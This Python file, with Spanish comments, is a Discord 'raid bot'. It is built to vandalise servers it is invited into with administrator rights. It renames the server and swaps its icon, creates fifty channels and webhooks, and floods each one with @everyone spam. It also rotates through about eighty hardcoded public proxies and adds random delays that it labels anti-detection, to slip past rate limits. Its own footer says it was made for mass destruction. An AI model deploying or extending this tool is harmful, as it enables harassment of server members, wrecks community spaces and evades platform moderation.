import discord
from discord.ext import commands
import asyncio
import json
import os
import random
import time
from datetime import datetime
import aiohttp
import requests
from threading import Thread

# ═══════════════════════════════════════════════════════════
# CONFIGURACIÓN PRINCIPAL
# ═══════════════════════════════════════════════════════════

TOKEN = os.getenv("TOKEN", "TU_TOKEN_AQUI")
COMMAND_PREFIX = ";"
CONFIGS_DIR = "configs"
PROTECTED_GUILD_ID = 1529254825236234370  # Tu servidor protegido
BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1534675729181184020&permissions=8&integration_type=0&scope=bot"

# Crear directorio de configuraciones
if not os.path.exists(CONFIGS_DIR):
    os.makedirs(CONFIGS_DIR)

# Intents completos
intents = discord.Intents.all()
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)
bot.remove_command('help')

# ═══════════════════════════════════════════════════════════
# SERVIDOR FLASK PARA RENDER (24/7)
# ═══════════════════════════════════════════════════════════

from flask import Flask, jsonify

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "bot": "RaidBot v3.0",
        "version": "3.0",
        "anti_detection": "enabled",
        "webhook_system": "enabled",
        "protection": "active",
        "proxies_loaded": "50+"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "24/7"})

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, threaded=True, debug=False)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    print(f"[FLASK] Servidor web iniciado en puerto {os.environ.get('PORT', 8080)}")

# ═══════════════════════════════════════════════════════════
# SISTEMA ANTI-DETECCIÓN AVANZADO CON PROXIES
# ═══════════════════════════════════════════════════════════

class AntiDetection:
    def __init__(self):
        self.proxies = []
        self.current_proxy = 0
        self.last_action_time = 0
        self.min_delay = 1.0
        self.max_delay = 2.5
        self.load_proxies()
    
    def load_proxies(self):
        """Carga todos los proxies proporcionados"""
        proxy_list = [
            # HTTP Proxies
            "http://163.181.207.169:9999",
            "http://85.214.107.177:80",
            "http://175.138.231.145:80",
            "http://113.160.132.26:8080",
            "http://135.125.87.149:80",
            "http://54.67.110.244:29259",
            "http://46.47.197.210:3128",
            "http://103.175.237.234:3128",
            "http://101.132.252.152:9000",
            "http://153.72.68.0:8080",
            "http://139.224.186.221:9999",
            "http://54.180.117.151:32592",
            "http://183.110.216.159:8090",
            "http://111.230.27.213:3128",
            "http://151.115.99.193:10006",
            "http://85.99.248.64:1453",
            "http://77.38.244.214:80",
            "http://93.123.16.14:80",
            "http://43.241.247.43:8080",
            "http://45.239.48.101:999",
            "http://139.196.175.68:8888",
            "http://207.180.254.198:80",
            "http://103.169.154.4:83",
            "http://34.102.241.71:80",
            "http://94.78.67.171:80",
            "http://5.188.190.218:80",
            "http://13.60.181.61:53402",
            "http://125.122.35.253:8086",
            "http://103.178.23.6:8080",
            "http://103.134.221.52:1111",
            "http://202.6.200.30:3125",
            "http://142.44.240.116:80",
            "http://47.250.155.254:28",
            # SOCKS4
            "socks4://68.1.210.189:4145",
            "socks4://69.55.49.177:38182",
            "socks4://182.160.16.234:8020",
            "socks4://189.39.118.210:5678",
            "socks4://184.181.217.220:4145",
            "socks4://174.64.199.79:4145",
            # SOCKS5
            "socks5://47.91.89.3:115",
            "socks5://45.77.37.39:2025",
            "socks5://38.76.215.92:1080",
            "socks5://104.200.152.30:4145",
            "socks5://8.219.167.110:8082",
            "socks5://47.121.183.107:20000",
            "socks5://8.213.195.191:9091",
            "socks5://8.212.165.164:512",
            "socks5://8.130.37.235:3128",
            "socks5://175.27.250.85:44097",
            "socks5://8.213.156.191:50",
            "socks5://175.27.250.85:44057",
            "socks5://39.104.26.204:21025",
            "socks5://184.178.172.18:15280",
            "socks5://193.124.254.120:1080",
            "socks5://107.181.168.145:4145",
            "socks5://39.102.209.128:3128",
            "socks5://47.251.73.54:9080",
            "socks5://192.111.129.145:16894",
            "socks5://183.173.65.101:29290",
            "socks5://185.225.40.122:1080",
            "socks5://5.230.201.154:1080",
            "socks5://72.206.74.126:4145",
            "socks5://39.102.214.192:8888",
            "socks5://175.27.250.85:44056",
            "socks5://8.213.128.6:6666",
            "socks5://8.138.131.110:8080",
            "socks5://175.27.250.85:44059",
            "socks5://175.27.250.85:44020",
            "socks5://103.20.61.251:1080",
            "socks5://184.178.172.17:4145",
            "socks5://175.27.250.85:44019",
            "socks5://45.43.63.37:10808",
            "socks5://103.197.241.209:1080",
            "socks5://8.213.222.157:104",
            "socks5://144.24.47.42:1080",
            "socks5://175.27.250.85:44103",
            "socks5://47.250.11.111:10000",
        ]
        self.proxies = proxy_list
        print(f"[ANTI-DETECT] {len(self.proxies)} proxies cargados")
    
    def get_proxy(self):
        """Obtiene el siguiente proxy rotativo"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy % len(self.proxies)]
        self.current_proxy += 1
        return proxy
    
    async def smart_delay(self):
        """Delay inteligente para evitar rate limits"""
        elapsed = time.time() - self.last_action_time
        delay = random.uniform(self.min_delay, self.max_delay)
        
        if elapsed < 1.5:
            delay += random.uniform(1.5, 3)
        
        jitter = random.uniform(0.1, 0.3)
        total_delay = delay + jitter
        
        print(f"[ANTI-DETECT] Esperando {total_delay:.2f}s...")
        await asyncio.sleep(total_delay)
        self.last_action_time = time.time()
    
    def get_random_proxy_dict(self):
        """Retorna diccionario de proxy para requests/aiohttp"""
        proxy_url = self.get_proxy()
        if not proxy_url:
            return None
        
        if proxy_url.startswith("socks"):
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        return {
            'http': proxy_url,
            'https': proxy_url
        }

anti_detect = AntiDetection()

# ═══════════════════════════════════════════════════════════
# GESTIÓN DE CONFIGURACIONES
# ═══════════════════════════════════════════════════════════

class RaidConfig:
    def __init__(self):
        self.data = {
            "channel_name": None,
            "message_content": None,
            "message_image_path": None,
            "use_message_image": False,
            "change_server_name": False,
            "new_server_name": None,
            "change_server_icon": False,
            "server_icon_path": None,
            "webhook_name": None,
            "webhook_avatar_path": None,
            "use_webhook_name": False,
            "use_webhook_avatar": False,
            "created_at": None,
            "author_id": None
        }
    
    def to_dict(self):
        return self.data
    
    @classmethod
    def from_dict(cls, data):
        config = cls()
        config.data = data
        return config
    
    def save(self, name):
        self.data["created_at"] = datetime.now().isoformat()
        filepath = os.path.join(CONFIGS_DIR, f"{name}.json")
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(self.data, f, indent=2, ensure_ascii=False)
        return filepath
    
    @classmethod
    def load(cls, name):
        filepath = os.path.join(CONFIGS_DIR, f"{name}.json")
        if os.path.exists(filepath):
            with open(filepath, 'r', encoding='utf-8') as f:
                data = json.load(f)
                return cls.from_dict(data)
        return None

# ═══════════════════════════════════════════════════════════
# SISTEMA DE MENÚS INTERACTIVOS
# ═══════════════════════════════════════════════════════════

class ConfigMenu:
    def __init__(self, ctx):
        self.ctx = ctx
        self.config = RaidConfig()
        self.config.data["author_id"] = ctx.author.id
        self.messages_to_delete = []
    
    async def send_question(self, title, description, emoji="❓"):
        embed = discord.Embed(
            title=f"{emoji} ┃ {title}",
            description=description,
            color=0xFF0000,
            timestamp=datetime.now()
        )
        embed.set_footer(text="RaidBot v3.0 | Anti-Detection System")
        msg = await self.ctx.send(embed=embed)
        self.messages_to_delete.append(msg)
        return msg
    
    async def add_reactions(self, msg):
        await msg.add_reaction("✅")
        await msg.add_reaction("❌")
    
    async def wait_reaction(self, msg, timeout=60):
        def check(reaction, user):
            return user == self.ctx.author and str(reaction.emoji) in ["✅", "❌"] and reaction.message.id == msg.id
        
        try:
            reaction, user = await bot.wait_for('reaction_add', timeout=timeout, check=check)
            return str(reaction.emoji)
        except asyncio.TimeoutError:
            return None
    
    async def wait_message(self, timeout=120):
        def check(m):
            return m.author == self.ctx.author and m.channel == self.ctx.channel
        
        try:
            msg = await bot.wait_for('message', timeout=timeout, check=check)
            self.messages_to_delete.append(msg)
            return msg
        except asyncio.TimeoutError:
            return None
    
    async def send_success(self, text):
        embed = discord.Embed(
            title="✅ ┃ ¡Excelente!",
            description=text,
            color=0x00FF00,
            timestamp=datetime.now()
        )
        embed.set_footer(text="RaidBot v3.0")
        msg = await self.ctx.send(embed=embed)
        self.messages_to_delete.append(msg)
        await asyncio.sleep(1.5)
        return msg
    
    async def send_cancel(self, text):
        embed = discord.Embed(
            title="❌ ┃ Acción Cancelada",
            description=text,
            color=0xFFA500,
            timestamp=datetime.now()
        )
        embed.set_footer(text="RaidBot v3.0")
        msg = await self.ctx.send(embed=embed)
        self.messages_to_delete.append(msg)
        await asyncio.sleep(1)
        return msg
    
    async def cleanup(self):
        try:
            for msg in self.messages_to_delete:
                await msg.delete()
        except:
            pass

# ═══════════════════════════════════════════════════════════
# EVENTOS DEL BOT
# ═══════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║           RAID BOT v3.0 - Anti-Detection                 ║
    ║              Estado: ONLINE ✓                           ║
    ╚══════════════════════════════════════════════════════════╝
    Usuario: {bot.user}
    ID: {bot.user.id}
    Servidores: {len(bot.guilds)}
    Prefix: {COMMAND_PREFIX}
    Proxies: {len(anti_detect.proxies)}
    Protección: Servidor {PROTECTED_GUILD_ID} ✓
    """)

@bot.event
async def on_guild_join(guild):
    """Protección contra raids en tu servidor"""
    if guild.id == PROTECTED_GUILD_ID:
        print(f"[PROTECCIÓN] Intentando salir del servidor protegido: {guild.name}")
        await guild.leave()
        print(f"[PROTECCIÓN] Bot expulsado del servidor protegido")

# ═══════════════════════════════════════════════════════════
# COMANDOS DEL BOT
# ═══════════════════════════════════════════════════════════

@bot.command(name='help')
async def help_command(ctx):
    """Muestra la ayuda del bot"""
    embed = discord.Embed(
        title="📖 ┃ RAID BOT v3.0 - Guía de Comandos",
        description="Bot de raid avanzado con sistema Anti-Detection y Webhooks",
        color=0x00FFFF,
        timestamp=datetime.now()
    )
    
    embed.add_field(
        name=f"{COMMAND_PREFIX}raidconfig",
        value="```Inicia la configuración interactiva del raid\nConfigura paso a paso mediante reacciones ✅❌\n• Nombre de canales\n• Mensaje a enviar\n• Imagen adjunta\n• Cambio de nombre/icono del servidor\n• Nombre y avatar del webhook```",
        inline=False
    )
    
    embed.add_field(
        name=f"{COMMAND_PREFIX}raidstart <nombre>",
        value="```Inicia el raid con una configuración guardada\nEnvía enlace de invitación del bot\nEjemplo: ;raidconfig destruccion1```",
        inline=False
    )
    
    embed.add_field(
        name=f"{COMMAND_PREFIX}raidlist",
        value="```Muestra todas las configuraciones guardadas```",
        inline=False
    )
    
    embed.add_field(
        name=f"{COMMAND_PREFIX}raiddelete <nombre>",
        value="```Elimina una configuración guardada```",
        inline=False
    )
    
    embed.add_field(
        name="🔒 Sistema de Protección",
        value=f"Servidor protegido: `{PROTECTED_GUILD_ID}`\nEl bot no puede raidear este servidor",
        inline=False
    )
    
    embed.add_field(
        name="🛡️ Características Anti-Detection",
        value="• 50+ proxies rotativos\n• Delays aleatorios inteligentes\n• Rate limit protection\n• User-Agent rotation",
        inline=False
    )
    
    embed.add_field(
        name="⚡ Sistema Webhook",
        value="Siempre usa webhooks para máxima eficiencia\nPersonalización opcional de nombre y avatar",
        inline=False
    )
    
    embed.set_footer(text="RaidBot v3.0 | Creado para destrucción masiva")
    await ctx.send(embed=embed)

@bot.command(name='raidconfig')
async def raid_config(ctx):
    """Configuración interactiva del raid"""
    # Verificar protección
    if ctx.guild and ctx.guild.id == PROTECTED_GUILD_ID:
        await ctx.send("🛡️ **Este servidor está protegido contra raids.**")
        return
    
    menu = ConfigMenu(ctx)
    
    try:
        # PASO 1: Nombre de canales
        msg = await menu.send_question(
            "Configuración de Canales",
            "¿Deseas configurar el **nombre de los canales** que se crearán?\n\n"
            "Se crearán 50 canales con este nombre + número.",
            "📋"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Escribe el nombre que tendrán los canales:")
            name_msg = await menu.wait_message()
            if name_msg:
                menu.config.data["channel_name"] = name_msg.content
                await menu.send_success(f"✓ Nombre configurado: `{name_msg.content}`")
        else:
            await menu.send_cancel("Se omitirá la creación de canales.")
        
        # PASO 2: Mensaje
        msg = await menu.send_question(
            "Configuración del Mensaje",
            "¿Deseas configurar el **mensaje** que se enviará?\n\n"
            "Se spammeará en cada canal/webhook.",
            "💬"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Escribe el mensaje:")
            msg_content = await menu.wait_message()
            if msg_content:
                menu.config.data["message_content"] = msg_content.content
                await menu.send_success("✓ Mensaje configurado")
        else:
            await menu.send_cancel("No se enviará mensaje personalizado.")
        
        # PASO 3: Imagen del mensaje
        msg = await menu.send_question(
            "Imagen del Mensaje",
            "¿Deseas **adjuntar una imagen** al mensaje?\n\n"
            "Sube la imagen como archivo adjunto.",
            "🖼️"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Adjunta la imagen:")
            img_msg = await menu.wait_message()
            if img_msg and img_msg.attachments:
                attachment = img_msg.attachments[0]
                img_path = f"temp_msg_{attachment.filename}"
                await attachment.save(img_path)
                menu.config.data["message_image_path"] = img_path
                menu.config.data["use_message_image"] = True
                await menu.send_success(f"✓ Imagen guardada: `{attachment.filename}`")
            else:
                await menu.send_cancel("No se detectó imagen.")
        else:
            await menu.send_cancel("Sin imagen adjunta.")
        
        # PASO 4: Cambiar nombre del servidor
        msg = await menu.send_question(
            "Cambio de Nombre del Servidor",
            "¿Deseas **cambiar el nombre del servidor**?",
            "🏷️"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Escribe el nuevo nombre:")
            name_msg = await menu.wait_message()
            if name_msg:
                menu.config.data["change_server_name"] = True
                menu.config.data["new_server_name"] = name_msg.content
                await menu.send_success(f"✓ Nuevo nombre: `{name_msg.content}`")
        else:
            await menu.send_cancel("No se cambiará el nombre.")
        
        # PASO 5: Cambiar icono del servidor
        msg = await menu.send_question(
            "Cambio de Icono del Servidor",
            "¿Deseas **cambiar la foto del servidor**?\n\n"
            "Adjunta la nueva imagen.",
            "👑"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Adjunta la imagen:")
            icon_msg = await menu.wait_message()
            if icon_msg and icon_msg.attachments:
                attachment = icon_msg.attachments[0]
                icon_path = f"temp_icon_{attachment.filename}"
                await attachment.save(icon_path)
                menu.config.data["server_icon_path"] = icon_path
                menu.config.data["change_server_icon"] = True
                await menu.send_success("✓ Icono configurado")
            else:
                await menu.send_cancel("No se detectó imagen.")
        else:
            await menu.send_cancel("Sin cambio de icono.")
        
        # PASO 6: Nombre del webhook
        msg = await menu.send_question(
            "Nombre del Webhook",
            "¿Deseas personalizar el **nombre del webhook**?\n\n"
            "Aunque elijas ❌, se usarán webhooks con nombre por defecto.",
            "🎭"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Escribe el nombre del webhook:")
            name_msg = await menu.wait_message()
            if name_msg:
                menu.config.data["webhook_name"] = name_msg.content
                menu.config.data["use_webhook_name"] = True
                await menu.send_success(f"✓ Webhook: `{name_msg.content}`")
        else:
            await menu.send_cancel("Se usará nombre por defecto: 'RaidBot'")
            menu.config.data["webhook_name"] = "RaidBot"
        
        # PASO 7: Avatar del webhook
        msg = await menu.send_question(
            "Avatar del Webhook",
            "¿Deseas personalizar el **avatar del webhook**?\n\n"
            "Adjunta la imagen del avatar.",
            "🎨"
        )
        await menu.add_reactions(msg)
        reaction = await menu.wait_reaction(msg)
        
        if reaction == "✅":
            await menu.send_success("Adjunta el avatar:")
            avatar_msg = await menu.wait_message()
            if avatar_msg and avatar_msg.attachments:
                attachment = avatar_msg.attachments[0]
                avatar_path = f"temp_avatar_{attachment.filename}"
                await attachment.save(avatar_path)
                menu.config.data["webhook_avatar_path"] = avatar_path
                menu.config.data["use_webhook_avatar"] = True
                await menu.send_success("✓ Avatar guardado")
            else:
                await menu.send_cancel("No se detectó imagen.")
        else:
            await menu.send_cancel("Sin avatar personalizado.")
        
        # PASO 8: Guardar configuración
        msg = await menu.send_question(
            "Guardar Configuración",
            "🎉 ¡Configuración completada!\n\n"
            "**Ponle nombre a tu configuración** para usarla después:\n\n"
            "Escribe el nombre (ej: raid1, nuclear, etc.):",
            "💾"
        )
        
        name_msg = await menu.wait_message()
        if name_msg:
            config_name = name_msg.content.replace(" ", "_").lower()
            menu.config.save(config_name)
            
            # Resumen final
            resumen = f"""
            📋 **Resumen de Configuración `{config_name}`**
            
            📁 **Canales:** `{menu.config.data['channel_name'] or 'No'}`
            💬 **Mensaje:** `{'Sí' if menu.config.data['message_content'] else 'No'}`
            🖼️ **Imagen:** `{'Sí' if menu.config.data['use_message_image'] else 'No'}`
            🏷️ **Cambio nombre:** `{'Sí' if menu.config.data['change_server_name'] else 'No'}`
            👑 **Cambio icono:** `{'Sí' if menu.config.data['change_server_icon'] else 'No'}`
            🎭 **Webhook:** `{menu.config.data['webhook_name'] or 'RaidBot'}`
            🎨 **Avatar webhook:** `{'Sí' if menu.config.data['use_webhook_avatar'] else 'No'}`
            
            💡 **Usa:** `{COMMAND_PREFIX}raidstart {config_name}`
            """
            
            embed = discord.Embed(
                title="🎊 ┃ ¡CONFIGURACIÓN EXITOSA!",
                description=resumen,
                color=0x00FF00,
                timestamp=datetime.now()
            )
            embed.set_footer(text="RaidBot v3.0 | Anti-Detection + Webhooks")
            await ctx.send(embed=embed)
        
        await menu.cleanup()
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='raidstart')
async def raid_start(ctx, config_name: str = None):
    """Inicia el raid con configuración guardada"""
    # Verificar protección
    if ctx.guild and ctx.guild.id == PROTECTED_GUILD_ID:
        await ctx.send("🛡️ **Este servidor está protegido contra raids.**")
        return
    
    if not config_name:
        await ctx.send(f"❌ Uso: `{COMMAND_PREFIX}raidstart <nombre_config>`")
        return
    
    config = RaidConfig.load(config_name)
    if not config:
        await ctx.send(f"❌ Configuración `{config_name}` no encontrada.")
        return
    
    # Enviar enlace de invitación primero
    invite_embed = discord.Embed(
        title="🔗 Enlace de Invitación",
        description=f"**[➡️ INVITAR BOT A OTRO SERVIDOR]({BOT_INVITE_URL})**\n\n"
                   f"Una vez invitado a otro servidor, confirma el raid aquí.",
        color=0x3498db
    )
    await ctx.send(embed=invite_embed)
    
    # Confirmación
    embed = discord.Embed(
        title="⚠️ ┃ CONFIRMACIÓN DE RAID",
        description=f"¿Iniciar raid con **`{config_name}`** en este servidor?\n\n"
                   f"🔥 **Esta acción es IRREVERSIBLE** 🔥",
        color=0xFF0000
    )
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("✅")
    await msg.add_reaction("❌")
    
    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"]
    
    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
        
        if str(reaction.emoji) != "✅":
            await ctx.send("❌ Raid cancelado.")
            return
        
        await ctx.send("🔥 **INICIANDO RAID...** Sistema Anti-Detection activado.")
        
        # Cambiar nombre del servidor
        if config.data.get("change_server_name"):
            await anti_detect.smart_delay()
            try:
                await ctx.guild.edit(name=config.data["new_server_name"])
                print(f"[RAID] Nombre cambiado")
            except Exception as e:
                print(f"[ERROR] Nombre: {e}")
        
        # Cambiar icono del servidor
        if config.data.get("change_server_icon") and config.data.get("server_icon_path"):
            await anti_detect.smart_delay()
            try:
                with open(config.data["server_icon_path"], 'rb') as f:
                    await ctx.guild.edit(icon=f.read())
                print("[RAID] Icono cambiado")
            except Exception as e:
                print(f"[ERROR] Icono: {e}")
        
        # Preparar archivo de imagen para mensajes
        message_file = None
        if config.data.get("use_message_image") and config.data.get("message_image_path"):
            if os.path.exists(config.data["message_image_path"]):
                message_file = discord.File(config.data["message_image_path"])
        
        # Crear canales y webhooks
        channel_name = config.data.get("channel_name")
        message_content = config.data.get("message_content") or "@everyone RAID INICIADO"
        webhook_name = config.data.get("webhook_name") or "RaidBot"
        
        channels_created = []
        webhooks_created = []
        
        if channel_name:
            # Crear 50 canales
            for i in range(50):
                await anti_detect.smart_delay()
                try:
                    ch = await ctx.guild.create_text_channel(f"{channel_name}-{i+1}")
                    channels_created.append(ch)
                    
                    # Crear webhook inmediatamente
                    await anti_detect.smart_delay()
                    
                    # Preparar avatar del webhook
                    avatar_bytes = None
                    if config.data.get("use_webhook_avatar") and config.data.get("webhook_avatar_path"):
                        if os.path.exists(config.data["webhook_avatar_path"]):
                            with open(config.data["webhook_avatar_path"], 'rb') as f:
                                avatar_bytes = f.read()
                    
                    webhook = await ch.create_webhook(
                        name=webhook_name,
                        avatar=avatar_bytes
                    )
                    webhooks_created.append(webhook)
                    print(f"[RAID] Canal + Webhook creado: {ch.name}")
                    
                except Exception as e:
                    print(f"[ERROR] Creando canal/webhook: {e}")
                    continue
            
            # Spammear con webhooks (más eficiente)
            await ctx.send(f"🚀 Spameando con {len(webhooks_created)} webhooks...")
            
            for webhook in webhooks_created:
                for _ in range(15):  # 15 mensajes por webhook
                    await anti_detect.smart_delay()
                    try:
                        if config.data.get("use_message_image") and config.data.get("message_image_path"):
                            if os.path.exists(config.data["message_image_path"]):
                                with open(config.data["message_image_path"], 'rb') as f:
                                    await webhook.send(
                                        content=message_content,
                                        file=discord.File(config.data["message_image_path"])
                                    )
                            else:
                                await webhook.send(content=message_content)
                        else:
                            await webhook.send(content=message_content)
                    except Exception as e:
                        print(f"[ERROR] Enviando webhook: {e}")
                        break
        
        # Mensaje final
        embed = discord.Embed(
            title="✅ ┃ RAID COMPLETADO",
            description=f"""
            🔥 **Destrucción finalizada** 🔥
            
            📊 **Estadísticas:**
            • Canales creados: {len(channels_created)}
            • Webhooks creados: {len(webhooks_created)}
            • Mensajes enviados: ~{len(webhooks_created) * 15}
            • Anti-Detection: Activo
            • Proxies usados: Sí
            
            💾 Config: `{config_name}`
            """,
            color=0x00FF00
        )
        await ctx.send(embed=embed)
        
    except asyncio.TimeoutError:
        await ctx.send("⏰ Tiempo agotado. Raid cancelado.")

@bot.command(name='raidlist')
async def raid_list(ctx):
    """Lista configuraciones guardadas"""
    configs = [f.replace('.json', '') for f in os.listdir(CONFIGS_DIR) if f.endswith('.json')]
    
    if not configs:
        await ctx.send("📂 No hay configuraciones guardadas.")
        return
    
    embed = discord.Embed(
        title="📋 Configuraciones Guardadas",
        description="\n".join([f"• `{c}`" for c in configs]),
        color=0x0099FF
    )
    await ctx.send(embed=embed)

@bot.command(name='raiddelete')
async def raid_delete(ctx, config_name: str):
    """Elimina una configuración"""
    filepath = os.path.join(CONFIGS_DIR, f"{config_name}.json")
    if os.path.exists(filepath):
        os.remove(filepath)
        await ctx.send(f"🗑️ Configuración `{config_name}` eliminada.")
    else:
        await ctx.send(f"❌ Configuración no encontrada.")

# ═══════════════════════════════════════════════════════════
# INICIAR BOT
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)